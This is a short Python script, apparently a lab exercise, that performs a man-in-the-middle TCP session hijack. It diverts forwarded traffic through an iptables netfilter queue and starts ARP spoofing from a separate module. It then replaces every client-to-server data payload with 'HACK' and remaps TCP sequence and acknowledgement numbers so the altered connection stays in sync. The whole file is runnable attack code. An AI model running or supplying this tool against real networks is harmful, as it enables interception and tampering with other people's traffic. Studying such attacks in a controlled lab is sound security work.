from netfilterqueue import NetfilterQueue
from scapy.layers.inet import IP, TCP
from scapy.all import *

# Dictionaries to map sequence numbers (real ones with those expected by the server/client)
ackDict = {}
seqDict = {}

def handle_packet(packet): # Function to process packets
    pkt = IP(packet.get_payload())
    if pkt.haslayer(TCP): # If the packet has a TCP layer
        seq = pkt[TCP].seq
        ack = pkt[TCP].ack
        new_payload = ""
        payload = bytes(pkt[TCP].payload).decode('UTF8', 'replace') # Packet payload to be processed

        if pkt[IP].dst == "198.7.0.2" and pkt[TCP].flags == "PA":  # From client to server
            new_payload = "HACK"  # Variable used below to know how to map the sequence number and ack number
            pkt.load = "HACK" # Actual payload change
            print("Packet Malformed! Payload changed to: HACK")
            print()

        if pkt[IP].dst == "198.7.0.1" and pkt[TCP].flags == "PA": # From server to client and it's a PUSH-ACK packet, meaning it has a payload in it
            new_payload = bytes(pkt[TCP].payload).decode('UTF8', 'replace') # We don't modify the payload from server to client, but we need it to map the sequence number and ack number

        new_seq = seqDict.get(seq, seq) # If the sequence number is in the dictionary, we map it to the one expected by the server/client, otherwise, we leave it as is
        new_ack = ackDict.get(ack, ack) # If the ack number is in the dictionary, we map it to the one expected by the server/client, otherwise, we leave it as is
        seqDict[seq + len(payload)] = new_seq + len(new_payload) # Add the expected server/client sequence number to the dictionary
        ackDict[new_seq + len(new_payload)] = seq + len(payload)

        pkt[TCP].seq = new_seq # Change the packet's sequence number
        pkt[TCP].ack = new_ack

        del pkt[IP].chksum # Remove the checksums and packet length to be recalculated
        del pkt[TCP].chksum
        del pkt[IP].len

        print()
        print()

    packet.drop() # netfilterqueue has some bugs, so we need to send it manually with scapy
    send(pkt, verbose=False)
    return

os.system("iptables -I FORWARD -j NFQUEUE --queue-num 3") # Add the iptables rule to send packets to the netfilterqueue
nfqueue = NetfilterQueue()
nfqueue.bind(3, handle_packet) # Bind to netfilterqueue on queue 3

def arpSpoofing():  # ARP spoofing file
    import ManInTheMiddle

try:
    print("Attacking...")
    Thread(target=arpSpoofing).start()
    nfqueue.run()

except KeyboardInterrupt:
    nfqueue.unbind()
    os.system("iptables -D FORWARD 1") # Remove the iptables rule
    exit(0)
